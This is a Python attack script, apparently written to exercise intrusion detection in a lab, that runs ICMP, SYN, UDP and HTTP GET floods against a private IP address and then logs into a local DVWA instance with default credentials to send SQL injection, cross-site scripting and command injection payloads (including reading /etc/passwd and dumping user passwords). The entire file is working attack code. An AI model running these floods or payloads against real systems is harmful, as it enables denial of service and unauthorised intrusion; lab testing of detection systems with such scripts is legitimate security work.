import socket
import threading
import time
import random
import requests
from bs4 import BeautifulSoup

# ---------------------- Network Attacks ----------------------

def icmp_flood(target_ip, count=1000):  # Increased count for better detection
    print("[*] Starting ICMP Flood...")
    # Need root privileges for this to work
    try:
        # Use subprocess to call ping instead of raw sockets
        import subprocess
        for _ in range(count):
            subprocess.Popen(f"ping -c 1 -W 1 {target_ip}", shell=True, 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[+] Sent ICMP packet to {target_ip}")
            time.sleep(0.01)  # Small delay to not overwhelm local system
    except Exception as e:
        print(f"[!] ICMP Error: {e}")

def syn_flood(target_ip, target_port, count=1000):  # Increased for better detection
    print("[*] Starting SYN Flood...")
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setblocking(0)  # Non-blocking
            # Just initiate the connection and move on (don't wait)
            sock.connect_ex((target_ip, target_port))
            print(f"[+] Attempted SYN to {target_ip}:{target_port}")
        except:
            pass  # Expected to fail, so ignore errors
        time.sleep(0.01)  # Small delay

def udp_flood(target_ip, count=100):
    print("[*] Starting UDP Flood...")
    for _ in range(count):
        try:
            port = random.randint(1, 65535)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (target_ip, port))
            print(f"[+] Sent UDP packet to {target_ip}:{port}")
        except Exception as e:
            print(f"[!] UDP Error: {e}")

def http_get_flood(target_ip, target_port=80, count=100):  # Increased count
    print("[*] Starting HTTP GET Flood...")
    for i in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            # Add random query params and more headers
            random_param = f"?nocache={random.randint(1000000, 9999999)}"
            headers = (
                f"GET /{random_param} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Accept: text/html,application/xhtml+xml\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            sock.send(headers.encode())
            print(f"[+] Sent HTTP GET to {target_ip}")
            sock.close()
        except Exception as e:
            print(f"[!] HTTP GET Error: {e}")
        time.sleep(0.05)  # Small delay

# ---------------------- Web Attacks ----------------------

session = requests.Session()
base_url = "http://localhost/DVWA"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"
xss_url = f"{base_url}/vulnerabilities/xss_r/"
cmdi_url = f"{base_url}/vulnerabilities/exec/"

def login():
    print("[*] Logging into DVWA...")
    try:
        # Step 1: Get the login page to get the CSRF token
        r = session.get(login_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.find("input", {"name": "user_token"})["value"]

        # Step 2: Login with proper data
        data = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": token
        }
        response = session.post(login_url, data=data)
        
        # Step 3: Verify login success
        if "Welcome to Damn Vulnerable Web Application!" in response.text:
            print("[\u2714] Login successful")
            
            # Step 4: Set security level to low for testing
            security_url = f"{base_url}/security.php"
            r = session.get(security_url)
            soup = BeautifulSoup(r.text, 'html.parser')
            token = soup.find("input", {"name": "user_token"})["value"]
            
            data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": token
            }
            session.post(security_url, data=data)
            print("[\u2714] Security level set to low")
        else:
            print("[\u2718] Login failed")
    except Exception as e:
        print(f"[!] Login Error: {e}")

def sql_injection_attack():
    print("[*] Performing SQL Injection...")
    try:
        # Get the token first
        r = session.get(sqli_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.find("input", {"name": "user_token"})["value"]
        
        payloads = [
            "' OR '1'='1", 
            "1' OR 1=1 -- -", 
            "' UNION SELECT user,password FROM users -- -",
            "admin' --",
            "1' OR sleep(5) -- -"  # Time-based SQLi, highly detectable
        ]
        
        for payload in payloads:
            params = {"id": payload, "Submit": "Submit", "user_token": token}
            r = session.post(sqli_url, data=params)
            if "Surname" in r.text or "admin" in r.text:
                print(f"[\u2714] SQLi succeeded: {payload}")
            else:
                print(f"[\u2718] SQLi failed: {payload}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] SQLi Error: {e}")

def xss_attack():
    print("[*] Performing XSS Attack...")
    try:
        # Get the token first
        r = session.get(xss_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.find("input", {"name": "user_token"})["value"]
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<body onload='alert(\"XSS\")'>",
            "<svg/onload=alert(\"XSS\")>",
            "javascript:alert('XSS')"
        ]
        
        for payload in payloads:
            params = {"name": payload, "Submit": "Submit", "user_token": token}
            r = session.post(xss_url, data=params)
            if payload in r.text:
                print(f"[\u2714] XSS succeeded: {payload}")
            else:
                print(f"[\u2718] XSS failed: {payload}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] XSS Error: {e}")

def command_injection_attack():
    print("[*] Performing Command Injection...")
    try:
        # Get the token first
        r = session.get(cmdi_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        token = soup.find("input", {"name": "user_token"})["value"]
        
        payloads = [
            "127.0.0.1; whoami",
            "127.0.0.1 && cat /etc/passwd",
            "127.0.0.1 | ls -la",
            "127.0.0.1; sleep 5",  # Timing attack, highly detectable
            "127.0.0.1;`id`"  # Backticks, highly detectable
        ]
        
        for payload in payloads:
            params = {"ip": payload, "Submit": "Submit", "user_token": token}
            r = session.post(cmdi_url, data=params)
            if "uid=" in r.text or "www-data" in r.text or "/bin/" in r.text:
                print(f"[\u2714] CMDi succeeded: {payload}")
            else:
                print(f"[\u2718] CMDi may have failed: {payload}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] CMDi Error: {e}")

# ---------------------- Main ----------------------

victim_ip = "192.168.50.45"

if __name__ == "__main__":
    # Set target information
    victim_ip = "192.168.50.45"  # Update with your target IP
    
    # Ask for confirmation before running attacks
    confirm = input(f"Run attacks against {victim_ip}? (y/n): ")
    if confirm.lower() != 'y':
        print("Exiting.")
        exit()
    
    # Network attacks - run in separate threads
    threads = []
    threads.append(threading.Thread(target=icmp_flood, args=(victim_ip,)))
    threads.append(threading.Thread(target=syn_flood, args=(victim_ip, 80)))
    threads.append(threading.Thread(target=udp_flood, args=(victim_ip,)))
    threads.append(threading.Thread(target=http_get_flood, args=(victim_ip,)))
    
    for thread in threads:
        thread.start()
    
    # Wait for network attacks to complete
    for thread in threads:
        thread.join(timeout=60)  # Wait up to 60 seconds
        
    # Web application attacks - these run sequentially
    print("\n[*] Starting web application attacks...")
    login()
    sql_injection_attack()
    xss_attack()
    command_injection_attack()
    
    print("\n[+] All attacks completed")